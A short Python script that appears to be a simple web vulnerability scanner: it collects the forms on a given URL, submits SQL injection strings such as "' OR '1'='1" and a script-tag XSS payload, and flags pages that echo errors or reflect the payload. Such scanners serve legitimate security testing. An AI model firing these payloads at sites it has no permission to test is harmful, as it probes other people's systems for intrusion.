import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# 🔹 Test payloads
SQL_PAYLOADS = ["'", "' OR '1'='1", '" OR "1"="1']
XSS_PAYLOADS = ['<script>alert("XSS")</script>']

# 🔹 Get all forms from a webpage
def get_forms(url):
    res = requests.get(url, timeout=5)
    soup = BeautifulSoup(res.text, "html.parser")
    return soup.find_all("form")

# 🔹 Extract form details
def get_form_details(form):
    details = {}
    details["action"] = form.attrs.get("action")
    details["method"] = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})

    details["inputs"] = inputs
    return details

# 🔹 Submit form with payload
def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}

    for input in form_details["inputs"]:
        if input["type"] == "text":
            data[input["name"]] = payload
        else:
            data[input["name"]] = "test"

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

# 🔹 Scan for SQL Injection
def scan_sqli(url):
    forms = get_forms(url)
    print(f"\n[+] Testing SQL Injection on {len(forms)} forms...")

    for form in forms:
        details = get_form_details(form)

        for payload in SQL_PAYLOADS:
            response = submit_form(details, url, payload)

            errors = ["sql", "syntax", "mysql", "query failed"]
            if any(error in response.text.lower() for error in errors):
                print(f"[VULNERABLE - SQLi] {url}")
                return

# 🔹 Scan for XSS
def scan_xss(url):
    forms = get_forms(url)
    print(f"\n[+] Testing XSS on {len(forms)} forms...")

    for form in forms:
        details = get_form_details(form)

        for payload in XSS_PAYLOADS:
            response = submit_form(details, url, payload)

            if payload in response.text:
                print(f"[VULNERABLE - XSS] {url}")
                return

# 🔹 Main
if __name__ == "__main__":
    target_url = input("Enter URL to scan: ")

    print("\n🔍 Starting scan...")
    scan_sqli(target_url)
    scan_xss(target_url)

    print("\n✅ Scan completed.")